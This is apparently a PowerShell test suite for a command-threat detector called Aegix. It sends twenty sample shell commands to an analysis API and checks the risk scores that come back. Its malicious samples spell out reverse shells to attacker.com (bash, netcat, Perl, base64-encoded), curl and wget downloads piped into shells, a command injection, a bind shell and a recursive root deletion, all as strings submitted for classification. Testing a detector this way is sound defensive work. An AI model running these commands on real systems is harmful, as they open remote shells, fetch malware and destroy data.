# ============================================================
# Aegix Test Suite - 20 Sample Commands
# ============================================================
# Test the Aegix API at: https://kernalaisecurity-production.up.railway.app
# 
# These commands test the full threat detection pipeline:
# - Safe commands (low risk)
# - Suspicious commands (medium risk)
# - Malicious commands (high risk)
# ============================================================

$API_URL = "https://kernalaisecurity-production.up.railway.app"

Write-Host "🛡️  Aegix API Test Suite" -ForegroundColor Cyan
Write-Host "API URL: $API_URL`n" -ForegroundColor Yellow

# ============================================================
# CATEGORY 1: SAFE COMMANDS (Expected: SAFE, Risk < 20)
# ============================================================

Write-Host "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━" -ForegroundColor Green
Write-Host "CATEGORY 1: SAFE COMMANDS" -ForegroundColor Green
Write-Host "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`n" -ForegroundColor Green

$tests = @(
    @{
        num = 1
        name = "List directory"
        cmd = "ls -la /home"
    },
    @{
        num = 2
        name = "Print working directory"
        cmd = "pwd"
    },
    @{
        num = 3
        name = "Display file contents"
        cmd = "cat /etc/hosts"
    },
    @{
        num = 4
        name = "Create directory"
        cmd = "mkdir -p /tmp/test_dir"
    },
    @{
        num = 5
        name = "Copy file"
        cmd = "cp /etc/hostname /tmp/hostname.bak"
    }
)

foreach ($test in $tests) {
    Write-Host "Test $($test.num): $($test.name)" -ForegroundColor Green
    Write-Host "Command: $($test.cmd)" -ForegroundColor Gray
    
    $response = curl -s -X POST "$API_URL/analyze" `
        -H "Content-Type: application/json" `
        -d "{`"command`":`"$($test.cmd)`"}" | ConvertFrom-Json
    
    Write-Host "Classification: $($response.classification)" -ForegroundColor $(if ($response.classification -eq 'safe') { 'Green' } else { 'Red' })
    Write-Host "Risk Score: $($response.risk_score)/100" -ForegroundColor $(if ($response.risk_score -lt 20) { 'Green' } else { 'Yellow' })
    Write-Host "ML Confidence: $($response.ml_confidence)" -ForegroundColor Gray
    Write-Host ""
}

# ============================================================
# CATEGORY 2: SUSPICIOUS COMMANDS (Expected: SUSPICIOUS, Risk 20-70)
# ============================================================

Write-Host "`n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━" -ForegroundColor Yellow
Write-Host "CATEGORY 2: SUSPICIOUS COMMANDS" -ForegroundColor Yellow
Write-Host "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`n" -ForegroundColor Yellow

$suspiciousTests = @(
    @{
        num = 6
        name = "Command substitution"
        cmd = "echo \$(whoami)"
    },
    @{
        num = 7
        name = "Pipe to interpreter"
        cmd = "cat /tmp/script.sh | bash"
    },
    @{
        num = 8
        name = "Python code execution"
        cmd = "python -c \"import os; print(os.getcwd())\""
    },
    @{
        num = 9
        name = "Bash with -c flag"
        cmd = "bash -c 'ls -la /'"
    },
    @{
        num = 10
        name = "Curl with pipe"
        cmd = "curl http://example.com | sh"
    }
)

foreach ($test in $suspiciousTests) {
    Write-Host "Test $($test.num): $($test.name)" -ForegroundColor Yellow
    Write-Host "Command: $($test.cmd)" -ForegroundColor Gray
    
    $response = curl -s -X POST "$API_URL/analyze" `
        -H "Content-Type: application/json" `
        -d "{`"command`":`"$($test.cmd)`"}" | ConvertFrom-Json
    
    Write-Host "Classification: $($response.classification)" -ForegroundColor $(if ($response.classification -eq 'suspicious') { 'Yellow' } else { 'Red' })
    Write-Host "Risk Score: $($response.risk_score)/100" -ForegroundColor $(if ($response.risk_score -gt 20 -and $response.risk_score -lt 70) { 'Yellow' } else { 'Red' })
    Write-Host "ML Confidence: $($response.ml_confidence)" -ForegroundColor Gray
    Write-Host ""
}

# ============================================================
# CATEGORY 3: MALICIOUS COMMANDS (Expected: MALICIOUS, Risk > 70)
# ============================================================

Write-Host "`n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━" -ForegroundColor Red
Write-Host "CATEGORY 3: MALICIOUS COMMANDS" -ForegroundColor Red
Write-Host "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`n" -ForegroundColor Red

$maliciousTests = @(
    @{
        num = 11
        name = "Reverse shell (bash)"
        cmd = "bash -i >& /dev/tcp/attacker.com/4444 0>&1"
    },
    @{
        num = 12
        name = "Remote code execution via curl"
        cmd = "curl http://attacker.com/malware.sh | bash"
    },
    @{
        num = 13
        name = "Destructive rm command"
        cmd = "rm -rf / --no-preserve-root"
    },
    @{
        num = 14
        name = "Base64 encoded payload"
        cmd = "echo YmFzaCAtaSA+JiAvZGV2L3RjcC9hdHRhY2tlci5jb20vNDQ0NCAwPiYx | base64 -d | bash"
    },
    @{
        num = 15
        name = "Command injection with semicolon"
        cmd = "app.sh; curl http://evil.com/steal.sh | sh"
    },
    @{
        num = 16
        name = "wget with pipe"
        cmd = "wget -O- http://malicious.com/bot | python"
    },
    @{
        num = 17
        name = "Netcat reverse shell"
        cmd = "nc -e /bin/sh attacker.com 1234"
    },
    @{
        num = 18
        name = "Perl one-liner exploit"
        cmd = "perl -e 'use Socket;$i=\"attacker.com\";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}'"
    },
    @{
        num = 19
        name = "Ncat listener"
        cmd = "ncat -l -p 9999 -e /bin/sh"
    },
    @{
        num = 20
        name = "In-memory process execution"
        cmd = "exec 255<> /dev/tcp/attacker.com/443; cat <&255 | /bin/bash 2>&1 >&255"
    }
)

foreach ($test in $maliciousTests) {
    Write-Host "Test $($test.num): $($test.name)" -ForegroundColor Red
    Write-Host "Command: $($test.cmd)" -ForegroundColor Gray
    
    $response = curl -s -X POST "$API_URL/analyze" `
        -H "Content-Type: application/json" `
        -d "{`"command`":`"$($test.cmd)`"}" | ConvertFrom-Json
    
    Write-Host "Classification: $($response.classification)" -ForegroundColor $(if ($response.classification -eq 'malicious') { 'Red' } else { 'Yellow' })
    Write-Host "Risk Score: $($response.risk_score)/100" -ForegroundColor $(if ($response.risk_score -gt 70) { 'Red' } else { 'Yellow' })
    Write-Host "ML Confidence: $($response.ml_confidence)" -ForegroundColor Gray
    Write-Host ""
}

# ============================================================
# SUMMARY
# ============================================================

Write-Host "`n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━" -ForegroundColor Cyan
Write-Host "✅ Test suite complete!" -ForegroundColor Cyan
Write-Host "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━" -ForegroundColor Cyan

Write-Host "`nNext steps:" -ForegroundColor Cyan
Write-Host "1. Check the Aegix dashboard: $API_URL" -ForegroundColor Gray
Write-Host "2. View live events table" -ForegroundColor Gray
Write-Host "3. Monitor risk scores and classifications" -ForegroundColor Gray
